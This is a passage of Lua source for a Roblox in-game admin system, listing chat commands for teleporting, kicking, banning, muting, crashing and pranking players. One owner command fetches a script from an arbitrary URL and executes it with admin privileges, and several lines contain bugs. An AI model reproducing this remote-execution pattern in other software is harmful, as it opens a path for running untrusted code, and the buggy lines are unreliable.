	[{"fun", "togglefun"}] = {"", "Toggles if fun commands can be executed or not from members", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Settings.Fun = not Settings.Fun
		GUI:MessageAdmins("Fun Commands", "Fun commands can be executed: "..STRING:StringToBool(Settings.Fun))
	end};
	
	[{"abuse", "abusive", "abusable", "toggleabuse", "toggleabusable"}] = {"", "Toggles if abusable commands can be executed or not from members", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Settings.DisableAbuse = not Settings.DisableAbuse
		GUI:MessageAdmins("Abusable Commands", "Abusable commands can be executed from members now: "..(not STRING:StringToBool(Settings.DisableAbuse)))
	end};
	
	[{"fontlist", "fonts", "getfont", "getfonts"}] = {"", "Shows all fonts available", 0, "Member", false, function(Speaker, Rank, Arguments)
		local List = {}
		for Font,_ in pairs(Fonts) do
			if Font == Settings.Font then
				table.insert(List, Font.." "..Font.."  (CURRENT FONT)")
			else
				table.insert(List, Font.." "..Font)
			end
		end
		GUI:ListGui(Speaker, "Font list", List, 44453197)
	end};
	
	[{"exesound", "executesound"}] = {"ID", "Changes the sound ID of when a command is execute(0 for no sound)", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local SoundID = tonumber(Arguments[1])
		if SoundID then
			Settings.ExecuteNotificationSound = SoundID

			GUI:SendMessage(Speaker, "Execute sound success", "Sound execution notification sound has been changed to "..SoundID.." successfully", "Check")
		else
			GUI:SendMessage(Speaker, "Execute sound Fail", "Sound execution notification sound cannot be changed to "..Arguments[1].." because it is not a number", "Error")
		end
	end};
	
	[{"noexesound", "noexecutesound", "unexesound", "unexecutesound"}] = {"", "Changes the sound ID of when a command is executed to 0(So it doesn't play)", 0, "Owner", false, function(Speaker, Rank, Arguments)
		Settings.ExecuteNotificationSound = 0
	end};
	
	[{"char", "character"}] = {"player string/num(ID)", "Changes player's character appearance to look like the character with the id ID or string.", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, Arguments[2], false, Speaker)
		end
	end};
	
	[{"rich", "merely"}] = {"player", "Changes player's character appearance to look like Merely", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, 13416513, false, Speaker)
		end
	end};
	
	[{"makerm".."odellua", "luamodelma".."ker", "mml", "lmm"}] = {"player", "Changes player's character appearance to look like MakerMo".."delLua", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			coroutine.wrap(function()
				CORE:ChangeCharacter(Player, 38837082, false, Speaker)
				wait(1)
				GUI:SendMessage(Player, "Wow!", "You're looking cool!", "Admin", 7)
			end)()
		end
	end, Hidden = true};
	
	[{"become", "bcome"}] = {"player string/num(ID)", "Changes player's character appearance to look like the character with the id ID or string and also name you.", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, Arguments[2], false, Speaker, true)
		end
	end};
	
	[{"name", "rename"}] = {"player name", "Changes player's character name", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeName(Player, Arguments[2])
		end
	end};
	
	[{"noname", "unname"}] = {"player", "Removes player's names from the 'name' command", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				local Head = Player.Character:FindFirstChild("Label")
				if Head then Head:Destroy() end
				local Head = Player.Character:FindFirstChild("Head")
				if Head then Head.Transparency = 0 if Head:FindFirstChild("Face") then Head.face.Transparency = 0 end end
			end
		end
	end};
	
	[{"ogre", "shrek"}] = {"player", "Changes the player into shrek", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, 11397, false, Speaker)
		end
	end};
	
	[{"forcetp", "forcetp", "forceplace"}] = {"player num(ID)", "Forces a player to teleport to the place with the id of ID", 2, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum <= RANK:ConvertRank(Rank) then
				Server.TS:Teleport(Arguments[2], Player)
			end
		end
	end};
	
	[{"forcefollow"}] = {"player num(UserID)", "Forces a player to teleport to the place num(UserID) is at(Only works in universes at this time)", 2, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Suc, Err, PlaceID, IntID = Server.TS:GetPlayerPlaceInstanceAsync(tonumber(Arguments[2]))
		if Suc then
			for _,Player in pairs(Players) do
				Server.TS:TeleportToPlaceInstance(PlaceID, IntID, Player)
			end
		else
			GUI:SendMessage(Speaker, "Place Teleportation Failed for UserID: "..Arguments[2], "Cannot follow UserID: "..Arguments[2]..". Reason: "..Err, 5)
		end
	end};
	
	[{"follow"}] = {"player num(UserID)", "Prompts a player to teleport to the place num(UserID) is at(Only works in universes at this time)", 2, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		MARKET:PromptPurchase(Player, Arguments[2], Speaker, function()
			local Suc, Err, PlaceID, IntID = Server.TS:GetPlayerPlaceInstanceAsync(tonumber(Arguments[2]))
			if Suc then
				for _,Player in pairs(Players) do
					Server.TS:TeleportToPlaceInstance(PlaceID, IntID, Player)
				end
			else
				GUI:SendMessage(Speaker, "Place Teleportation Failed for UserID: "..Arguments[2], "Cannot follow UserID: "..Arguments[2]..". Reason: "..Err, 5)
			end
		end)
	end};
	
	[{"accelerate", "accel", "acl"}] = {"player", "Accelerates them across roblox", 1, "Admin", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum < RANK:ConvertRank(Rank) then
				Server.TS:Teleport(155307015, Player)
			end
		end
	end};
	
	[{"rickroll", "rickastly"}] = {"player", "Rick rolls them to the movies", 1, "Admin", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local _,RankNum = RANK:GetRank(Player)
			if RankNum < RANK:ConvertRank(Rank) then
				Server.TS:Teleport(347911447, Player)
			end
		end
	end};
	
	[{"shield"}] = {"player", "Creates a protective shield around the player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:GenerateShield(Player)
		end
	end};
	
	[{"noshield", "unshield", "deshield"}] = {"player", "Removes any protective shield around the player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				local Shield = Player.Character:FindFirstChild("Shield")
				if Shield then Shield:Destroy() end
			end
		end
	end};
	
	[{"chance", "possibility", "random"}] = {"num", "Will randomly see if a 1/num chance worked out or not", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Num = tonumber(Arguments[1])
		if Num and Num ~= 0 then
			local Random = math.random(1,math.abs(Num))
			if Random == math.random(1,math.abs(Num)) then
				GUI:SendMessage(Speaker, "Chance Success!", "Out of a 1/"..Num.." chance this message has shown up!", "Check")
			else
				GUI:SendMessage(Speaker, "Chance Failed.", "In the 1/"..Num.." chance given, there was no success", "Notice")
			end
		else
			GUI:SendMessage(Speaker, "Chance Error", Arguments[1].." is not a valid number", "Error")
		end
	end};
	
	[{"ircchat"}] = {"string", "Will chat on the connect IRC your message", 1, "Owner", false, function(Speaker, Rank, Arguments)
		IRC:Send("PRIVMSG "..Settings.IRCChannel.." :"..Speaker.Name..": "..Arguments[1])
		IRC:AddChat(Speaker.Name, Arguments[1])
	end};
	
	--[[
	[{"newserver", "makeserver"}] = {"", "Opens new server on the current game", 0, "Owner", false, function(Speaker, Rank, Arguments)
		local Res = REMOTE:GetURL(CORE.Domain.."/APIs/JoinGame.php?GameID="..game.PlaceId)
		if Res then
			GUI:SendMessage(Speaker, "Server created", "Server has been created", "Check")
		end
	end, Http = true};
	
	[{"remotenewserver", "remotemakeserver", "rns"}] = {"number(ID)", "Opens new server on the ID of the game", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Res = REMOTE:GetURL(CORE.Domain.."/APIs/JoinGame.php?GameID="..Arguments[1])
		if Res then
			GUI:SendMessage(Speaker, "Server created", "Server has been created on game: "..Arguments[1], "Check")
		end
	end}, Http = true;
	]]
	
	[{"ircreconnect", "ircr"}] = {"", "Reconnects IRC", 0, "Owner", false, function(Speaker, Rank, Arguments)
		IRC:Quit("Reconnecting")
		IRC:ConnectToServer(Settings.IRCServer)
	end};
	
	[{"irc", "ircgui"}] = {"player", "Will prompt irc chat on player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local PreAdd = {}
			for _,Data in pairs(IRC.Chats) do
				local Error = nil
				if Rank == "Owner" then Error = Data[3] end
				table.insert(PreAdd, {Data[1], Data[2], Error})
			end
			local SendPressed, AddMessage = GUI:CreateMessagePrompt(Player, "IRC Chat on channel "..Settings.IRCChannel, 146027317, PreAdd)
			IRC.MessageAdded.Event:connect(function(UserName, Message, Error)
				if Rank ~= "Owner" then Error = nil end
				AddMessage:Invoke(UserName, Message, Error)
			end)
			SendPressed.Event:connect(function(Text)
				IRC:Send("PRIVMSG "..Settings.IRCChannel.." :"..Player.Name..": "..Text)
				IRC:AddChat(Player.Name, Text)
			end)
		end
	end};
	
	[{"prichat", "privatechat", "pchat"}] = {"player", "Allows player to join the server's private chat", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local SendPressed, AddMessage = GUI:CreateMessagePrompt(Player, "Private chat", "Lock", PriChat.Chats, function(Type)
				if Type == "Leave" then
					PriChat.Chatted:Fire("[ PRICHAT ]", Player.Name.." has left the chat")
				elseif Type == "Join" then
					PriChat.Chatted:Fire("[ PRICHAT ]", Player.Name.." has joined the chat")
				end
			end)
			PriChat.Chatted.Event:connect(function(UserName, Message)
				AddMessage:Invoke(UserName, Message)
			end)
			SendPressed.Event:connect(function(Text)
				PriChat.Chatted:Fire(Player.Name, Text)
				table.insert(PriChat.Chats, {Player.Name, Text})
			end)
		end
	end};
	
	[{"script", "exe"}] = {"string", "Will execute a script with global admin variables", 1, "Owner", false, function(Speaker, Rank, Arguments)
		ExecuteSafe(Arguments[1], Speaker)
	end};
	
	[{"exehttp", "httpexe", "remoteexe", "plugin", "pluginhttp", "httpplugin", "remoteplugin"}] = {"string(URL)", "Will execute a script with global admin variables from the link", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Script = REMOTE:GetURL(Arguments[1], Player)
		if Script then
			ExecuteSafe(Script, Speaker)
		end
	end, Http = true};
	
	[{"ping", "url", "link", "http"}] = {"string(URL)", "Pings string which is a URL", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Time = tick()
		local Res = REMOTE:GetURL(Arguments[1], Player)
		if Res then
			GUI:SendMessage(Speaker, "Ping complete", "Response to: "..Arguments[1].." was complete in "..string.sub(tostring(tick() - Time),1,5).." seconds. Response: "..string.char(13, 10)..Res, "Check")
		end
	end, Http = true};
	
	[{"removeadmin", "ra"}] = {"", "Removes admin permanently", 0, "Owner", false, function(Speaker, Rank, Arguments)
		CORE:RemoveAdmin(Speaker)
	end};
	
	[{"h", "hint"}] = {"hint string", "Gives everyone in the server a hint string", 1, "Member", false, function(Speaker, Rank, Arguments)
		for _,Player in pairs(Server.Players:GetPlayers()) do
			GUI:SendHint(Player, Arguments[1], nil, Speaker)
		end
	end};
	
	[{"murica", "merica", "america"}] = {"murica player", "You'll have to find out yourself", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Debt = nil
		for _,Player in pairs(Players) do
			if not Debt then
				Debt = GUI:ShowDebtStats(Player)
			else
				GUI:ShowDebtStats(Player, Debt)
			end
		end
	end, Http = true};
	
	[{"hud", "target", "profiler"}] = {"player", "Opens a gui HUD that allows player to see player data", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			GUI:CreateHUD(Player)
		end
	end};
	
	[{"nohud", "notarget", "noprofiler", "unhud", "untarget", "unprofiler"}] = {"player", "Removes HUD Gui if it's on the player", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player:FindFirstChild("PlayerGui") then
				local HUD = Player.PlayerGui:FindFirstChild("Ma".."ke".."r".."m".."odelLu".."a's HUD Gui")
				if HUD then HUD:Destroy() end
			end
		end
	end};
	
	[{"vote", "poll"}] = {"player string", "Gives player 30 seconds to answer yes or no to the question string", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		GUI:Vote(Speaker, Players, Arguments[2], 30)
	end};
	
	[{"bomb", "terrorist", "suicide"}] = {"player", "Puts an explosive IED device on player", 1, "Admin", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ExecuteResource("Bomb", Player.Character)
		end
	end};
	
	[{"debug", "d", "regen"}] = {"player", "Respawns player wherever they are at and fixes camera", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:ChangeCharacter(Player, Player.UserId, false, Speaker)
			CORE:RestoreCamera(Player)
		end
	end};
	
	[{"debugme", "dm", "regenme"}] = {"player", "Respawns speaker wherever they are at and fixes camera", 0, "Member", false, function(Speaker, Rank, Arguments)
		CORE:ChangeCharacter(Speaker, Speaker.UserId, false, Speaker)
		CORE:RestoreCamera(Speaker)
	end};
	
	[{"tp", "teleport", "tele"}] = {"player1 player2", "Teleports player 1 to player 2", 2, "Member", false, function(Speaker, Rank, Arguments)
		local Players1 = STRING:Scan(Arguments[1], Speaker)
		local Players2 = STRING:Scan(Arguments[2], Speaker)
		for _,Player1 in pairs(Players1) do
			if Player1.Character and Player1.Character:FindFirstChild("Torso") then
				for _,Player2 in pairs(Players2) do
					if Player2.Character and Player2.Character:FindFirstChild("Torso") then
						Player1.Character:MoveTo(Player2.Character.Torso.Position)
					end
				end
			end
		end
	end};
	
	[{"respawn", "resp", "res"}] = {"player", "Respawns player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			Player:LoadCharacter()
		end
	end};
	
	[{"fixcam", "fixcamera"}] = {"player", "Fixes player's camera", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:RestoreCamera(Player)
		end
	end};
	
	[{"jail"}] = {"player", "Puts player in a cell", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:Jail(Player)
		end
	end};
	
	[{"nojail", "unjail"}] = {"player", "Takes player out of a cell", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:UnJail(Player)
		end
	end};
	
	[{"say", "speak", "charles", "talk"}] = {"string", "Will have Charles 2.0 say the text string", 1, "Member", false, function(Speaker, Rank, Arguments)
		SOUND:SayConvertedText(SOUND:ConvertText(Arguments[1]))
	end};
	
	[{"nosay", "nospeak", "nocharles", "notalk", "unsay", "unspeak", "uncharles", "stoptalking", "stopspeak", "stopcharles", "stopsay", "shush", "shutup"}] = {"", "Stops Charles 2.0 talking", 0, "Member", false, function(Speaker, Rank, Arguments)
		SOUND:StopSpeaking()
	end};
	
	[{"info", "information"}] = {"player", "Show's player's info", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		local Compile = {}
		for Num,Player in pairs(Players) do
			local PlayerRank = RANK:GetRank(Player)
			local PlayerInfo = ClientInfo[Player.Name]
			table.insert(Compile, {"Name: "..Player.Name, "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..Player.Name})
			table.insert(Compile, "User ID: "..Player.UserId)
			table.insert(Compile, "Age: "..STRING:FindAge(Player.AccountAge))
			table.insert(Compile, "Rank: "..PlayerRank)
			
			if PlayerInfo.Accelerometer ~= nil then table.insert(Compile, "Has Accelerometer: "..STRING:BoolString(PlayerInfo.Accelerometer)) end
			if PlayerInfo.Gyroscope ~= nil then table.insert(Compile, "Has Gyroscope: "..STRING:BoolString(PlayerInfo.Gyroscope)) end
			if PlayerInfo.Gamepad ~= nil then table.insert(Compile, "Has Gamepad: "..STRING:BoolString(PlayerInfo.Gamepad)) end
			if PlayerInfo.Mouse ~= nil then table.insert(Compile, "Has Mouse: "..STRING:BoolString(PlayerInfo.Mouse)) end
			if PlayerInfo.Keyboard ~= nil then table.insert(Compile, "Has Keyboard: "..STRING:BoolString(PlayerInfo.Keyboard)) end
			if PlayerInfo.TouchScreen ~= nil then table.insert(Compile, "Has TouchScreen: "..STRING:BoolString(PlayerInfo.TouchScreen)) end
			if PlayerInfo.Benchmark then
				table.insert(Compile, "BLUE BENCHMARK: "..PlayerInfo.Benchmark)
			end
			if Num ~= #Players then table.insert(Compile, "-----------------------------") end
		end
		GUI:ListGui(Speaker, "Information on "..#Players.." player(s)", Compile, "Information", false, false)
	end};
	
	[{"loopkill", "lkill", "loopk"}] = {"player num", "Kills player num times", 2, "Admin", false, function(Speaker, Rank, Arguments)
		if tonumber(Arguments[2]) then
			local Players = STRING:Scan(Arguments[1], Speaker)
			for _,Player in pairs(Players) do
				coroutine.wrap(function()
					if Player.Character then
						table.insert(LoopKills, Player.Name)
						local Loop = nil
						local PrevChar = nil
						
						for i = 1,tonumber(Arguments[2]) do
							local Char = Player.Character
							if PrevChar and PrevChar ~= Char then
								PrevChar:Destroy()
							end
							PrevChar = Char
							local CanDie = true
							for _,Name in pairs(LoopKills) do if Name == Player.Name then CanDie = true end end
							if CanDie == false then
								break
							end
							ypcall(function() Char.Parent = Server.Lighting end)
							wait(0.1)
							ypcall(function() Char.Parent = Server.Workspace end)
							wait(0.1)
						end
					end
				end)()
			end
		else
			GUI:SendMessage(Speaker, "Cannot execute", "RED Argument 2 is not a valid number", "Error")
		end
	end};
	
	[{"noloopkill", "nolkill", "noloopk", "unloopkill", "unlkill", "unloopk"}] = {"player num", "Stops any loop kills on a player", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			for Num,Name in pairs(LoopKills) do
				if Player.Name == Name then
					table.remove(LoopKills, Num)
				end
			end
		end
	end};
	
	[{"sound", "audio", "music"}] = {"num/string", "Plays the sound ID or string from the soundlist", 1, "Member", false, function(Speaker, Rank, Arguments)
		SOUND:PlayGlobalSound(Arguments[1])
	end};
	
	[{"nosound", "noaudio", "nomusic", "stopsound", "stopaudio", "stopmusic"}] = {"", "Removes the current sound playing", 0, "Member", false, function(Speaker, Rank, Arguments)
		SOUND:StopGlobalSound()
		SOUND:ClearInfo()
	end};
	
	[{"pitch"}] = {"num", "Sets the pitch of the current sound to num", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Pitch = tonumber(Arguments[1])
		if not Pitch then Pitch = 1 end
		if Sound then
			Sound.Pitch = Pitch
		end
	end};
	
	[{"search", "searchsound", "searchsounds", "searchaudio", "searchmusic", "ss"}] = {"string", "Searches the catalog for the sound string", 1, "Member", false, function(Speaker, Rank, Arguments)
		local CloseGui, AddInfo = GUI:LoadGui(Speaker, "Searching for: "..Arguments[1])
		local Items = MARKET:SearchItem(9, Arguments[1])
		if Items then
			if #Items ~= 0 then
				local List,Correlate = {},{}
				for Num,Info in pairs(Items) do
					local Display = " "..Info.Name.." by: "..Info.Creator.." ("..Info.AssetId..")"
					table.insert(List, Display)
					Correlate[Display] = Info.AssetId
				end
				CloseGui:Invoke()
				
				local CanClick = true
				if Rank == "Member" then CanClick = false end
				local Clicked = GUI:ListGui(Speaker, "Search Results: "..Arguments[1], List, "Search", CanClick)
				Clicked.Event:connect(function(ClickName)
					local OldSoundId = nil
					SOUND:StopGlobalSound()
					if "rbxassetid://"..Correlate[ClickName] ~= OldSoundID then
						SOUND:PlayGlobalSound(Correlate[ClickName])
					end
				end)
			else
				CloseGui:Invoke()
				GUI:SendMessage(Speaker, "No results", "BLUE No results for "..Arguments[1].." found...", "Information")
			end
		else
			CloseGui:Invoke()
			GUI:SendMessage(Speaker, "Cannot get audio", "RED Cannot get audio. Is HttpService enabled?", "Error")
		end
	end, Http = true};
	
	[{"gun"}] = {"player", "Gives player a gun", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character then
				CORE:ExecuteResource("Gun", Player.Character)
			end
		end
	end};
	
	[{"sink", "pothole", "quicksand"}] = {"player", "Sinks the player", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") and Player.Character:FindFirstChild("Humanoid") then
				local Hole = Instance.new("Part", Player.Character) Hole.Name = "Hole" Hole.BrickColor = BrickColor.new("Really black") Hole.Size = Vector3.new(5,1.2,5) Hole.Anchored = true  Hole.CanCollide = fals Hole.Locked = true Hole.CFrame = Player.Character.Torso.CFrame * CFrame.new(0,-3.5,0) * CFrame.Angles(0,0,0) Instance.new("CylinderMesh", Hole)
				Player.Character.Humanoid.WalkSpeed = 0
				Player.Character.Torso.Anchored = true
				coroutine.wrap(function()
					local OldCFrame = Player.Character.Torso.CFrame
					for i = 0,8,0.1 do
						Player.Character.Torso.CFrame = OldCFrame * CFrame.new(0,-i,0)
						wait()
					end
					Player.Character.Torso.Anchored = false
					Player.Character:BreakJoints()
					CORE:InvisiblePlayer(Player)
				end)()
			end
		end
	end};
	
	[{"freeze", "anchor"}] = {"player", "Freezes player in place", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:AnchorPlayer(Player)
		end
	end};
	
	[{"nofreeze", "unfreeze", "noanchor", "unanchor", "thaw"}] = {"player", "Unfreezes player", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:UnanchorPlayer(Player)
		end
	end};
	
	[{"invisible", "invis"}] = {"player", "Makes player invisible", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:InvisiblePlayer(Player)
		end
	end};
	
	[{"visible", "vis"}] = {"player", "Makes player visible", 1, "Member", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			CORE:VisiblePlayer(Player)
		end
	end};
	
	[{"asteroid", "comet", "meteor", "meteorite"}] = {"player", "Shoots an asteroid at player", 1, "Member", true, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			if Player.Character and Player.Character:FindFirstChild("Torso") then
				local Ast = Instance.new("Part", Server.Workspace) Ast.Name = "Asteroid" Ast.Position = Player.Character.Torso.Position + Vector3.new(0,500,0) Ast.Size = Vector3.new(12,12,12)
				local Mesh = Instance.new("SpecialMesh", Ast) Mesh.MeshId = "rbxassetid://1290033" Mesh.Scale = Vector3.new(6.2,6.2,6.2) Mesh.TextureId = "rbxassetid://1290030"
				local Fire = Instance.new("Fire", Ast) Fire.Heat = 25 Fire.Size = 30
				local Smoke = Instance.new("Smoke", Ast) Smoke.RiseVelocity = 10 Smoke.Size = 10
				local BoomSound = SOUND:MakeSound(Ast, 188590169, 1, 1)
				local Fly = SOUND:MakeSound(Ast, 179438534, 1, 1, true)
				Fly:Play()
				local Touched = false
				coroutine.wrap(function()
					repeat wait(0.1)
						Ast.Position = Vector3.new(Player.Character.Torso.Position.X, Ast.Position.Y, Player.Character.Torso.Position.Z)
					until not Ast or Ast.Parent == nil or Touched == true
				end)()
				Ast.Touched:connect(function(Part)
					if Touched == false then
						Touched = true
						Part:BreakJoints()
						local Boom = Instance.new("Explosion", Workspace)
						Boom.Position = Ast.Position
						Boom.BlastPressure = 1000000
						Boom.BlastRadius = 30
						Fire.Heat = 0
						Smoke.RiseVelocity = 0
						Fly:Stop()
						BoomSound:Play()
						coroutine.wrap(function()
							wait(3)
							BoomSound:Stop()
							if Ast and Ast.Parent ~= nil then
								Ast:Destroy()
							end
						end)()
					end
				end)
			end
		end
	end};
	
	[{"kick"}] = {"player", "Will kick player out of the server", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Success = {}
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local PlayerRank = RANK:GetRank(Player)
			if PlayerRank ~= "Owner" and PlayerRank ~= "Admin" then
				CORE:Kick(Player)
				table.insert(Success, Player)
			end
		end
		REMOTE:SendHttpLog(Speaker.Name.." kicked "..CORE:UnpackPlayers(Success), "INFORMATION")
	end};
	
	[{"ban"}] = {"player", "Will ban player and will be unable to join", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Success = {}
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local PlayerRank = RANK:GetRank(Player)
			if PlayerRank ~= "Owner" and PlayerRank ~= "Admin" then
				RANK:RemoveRank(Player)
				table.insert(Settings.Ranks.Banned, Player.Name)
				CORE:Kick(Player)
				table.insert(Success, Player)
			end
		end
		REMOTE:SendHttpLog(Speaker.Name.." banned "..CORE:UnpackPlayers(Success), "WARNING")
	end};
	
	[{"crash"}] = {"player", "Will crash player with a painful BSOD", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Success = {}
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local PlayerRank = RANK:GetRank(Player)
			if PlayerRank ~= "Owner" then
				RANK:RemoveRank(Player)
				table.insert(Settings.Ranks.Crashed, Player.Name)
				CORE:Crash(Player)
				table.insert(Success, Player)
			end
		end
		REMOTE:SendHttpLog(Speaker.Name.." crashed "..CORE:UnpackPlayers(Success), "INFORMATION")
	end};
	
	[{"mute"}] = {"player", "Makes player unable to talk", 1, "Owner", false, function(Speaker, Rank, Arguments)
		local Success = {}
		local Players = STRING:Scan(Arguments[1], Speaker)
		for _,Player in pairs(Players) do
			local PlayerRank = RANK:GetRank(Player)
			if PlayerRank ~= "Owner" then
				RANK:RemoveRank(Player)
				table.insert(Settings.Ranks.Muted, Player.Name)
				GUI:CoreGui(Player, "Chat", false)
				table.insert(Success, Player)
			end
		end
		REMOTE:SendHttpLog(Speaker.Name.." has muted "..CORE:UnpackPlayers(Success), "INFORMATION")
	end};
	
	[{"noadmin", "unadmin", "nomember", "unmember", "nomem", "unmem", "noowner", "unowner", "noown", "unown", "nocrash", "uncrash", "noban", "unban", "nomute", "unmute", "derank"}] = {"player", "Removes whatever rank player has(if your rank is sufficient enough to override player's)", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		if #Players > 0 then
			local Success = {}
			for _,Player in pairs(Players) do
				local RankName,RankNum = RANK:GetRank(Player)
				if RankNum < RANK:ConvertRank(Rank) or RANK:IsSupremeOwner(Speaker) then
					if not RANK:IsSupremeOwner(Player) then
						if RankName == "Muted" then
							GUI:CoreGui(Player, "Chat", true)
						end
						if RankNum > 0 then
							GUI:TellNotAdmin(Player)
						end
						RANK:RemoveRank(Player)
						table.insert(Success, Player)
					end
				end
			end
			REMOTE:SendHttpLog(Speaker.Name.." has unranked "..CORE:UnpackPlayers(Players), "INFORMATION")
		else
			local Player,PlayerRank = RANK:GetPlayerFromList(Arguments[1])
			if Player then
				local RankNum = RANK:ConvertRank(PlayerRank)
				if RANK:IsSupremeOwner(Speaker) or RankNum < RANK:ConvertRank(Rank) then
					if not RANK:IsSupremeOwner(Player) then
						RANK:RemoveRank(Player)
						REMOTE:SendHttpLog(Speaker.Name.." has unranked "..Player, "INFORMATION")
					end
				end
			end
		end
	end};
	
	[{"member", "mem"}] = {"player", "Adds player to the member list", 1, "Admin", false, function(Speaker, Rank, Arguments)
		local Players = STRING:Scan(Arguments[1], Speaker)
		if #Players > 0 then
			local Success = {}
			for _,Player in pairs(Players) do
				local PlayerRank,RankNum = RANK:GetRank(Player)
				if RANK:ConvertRank(Rank) > RankNum or RANK:IsSupremeOwner(Speaker) and not RANK:IsSupremeOwner(Player) then
					RANK:RemoveRank(Player)
					table.insert(Settings.Ranks.Member, Player.Name)
					GUI:TellAdmin(Player)
					table.insert(Success, Player)
				end
			end
			REMOTE:SendHttpLog(Speaker.Name.." has membered "..CORE:UnpackPlayers(Success), "INFORMATION")
		else
			local Player,PlayerRank = RANK:GetPlayerFromList(Arguments[1])
			if Player then
				local RankNum = RANK:ConvertRank(PlayerRank)
				if RANK:IsSupremeOwner(Speaker) or RankNum < RANK:ConvertRank(Rank) then
